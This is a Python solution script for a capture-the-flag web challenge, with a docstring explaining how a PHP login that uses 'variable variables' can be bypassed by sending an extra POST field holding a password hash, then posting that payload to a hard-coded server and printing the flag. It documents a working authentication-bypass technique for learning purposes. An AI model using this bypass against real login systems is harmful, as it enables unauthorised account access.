import requests

"""
This is the verification code:

$users = [
    'l337haxx00r' => '$2y$10$FXt6xgp7jgkPH4qiFf1Fx.oIg3ZUWFj8jf3g1zwCDrJzK/vXQy/a6',
    'jeffbezos89' => '$2y$10$8jKNL0FZgsqqXzxC6akQxe0Y9Psu94kQDPfOyj8os986SyXNnIFfa',
];
$Array = $_POST;

if (password_verify($Array['password'], $$users[$Array['username']])) {
    $success = true;
} else {
    $success = false;
}

Two interesting things to note:
    1. A temporary variable "Array" is created that points to $_POST
    2. The extra "$" at the start of $$users[$Array['username']] is a little strange

The strange extra "$" is a weird feature of PHP called "Variable variables". 
This is how they work:
    $temp = "variable_name"
    $$temp = "some_text"   <=>  $variable_name = "some_text"
More specifically $$var is the same as ${strval($var)}. That is, the new variable name will be the toString()
of the value that $var points to. (so it assumes $var has a toString() function)

In the case of this task things work out like this:
    $$users[$Array['username']]
     ------
       |
       V
     "Array" = strval($users) = strval(array())
       |
       V
    $Array[$Array['username']]

And since we actually have the variable "Array" which points to $_POST, this will try to select whatever our supplied username points to in the $_POST array. 
Finally we have our exploit:
    1. Select a username
    2. Select a password and generate a valid hash of that password. 
    3. Send username, password but also send a parameter, with the same name as our username, pointing to the valid hash. 
    4. Ez flag!
"""

post_params = {
    "username" : "test_user",
    "password" : "getflag",
    "test_user" : "$2y$10$HSgK5H8JyyMK8yAx5/1i4OTByEvyX12gobvo9DyQWXMwc9K2aakqa" # this is the hash of "getflag" (the password supplied) generated by password_hash() in PHP
}

r = requests.post("http://35.217.1.205:50000/", data=post_params)
print(r.text)

# SSM{1_c4n7_b3_5urpr153d_by_php_4nym0r3}
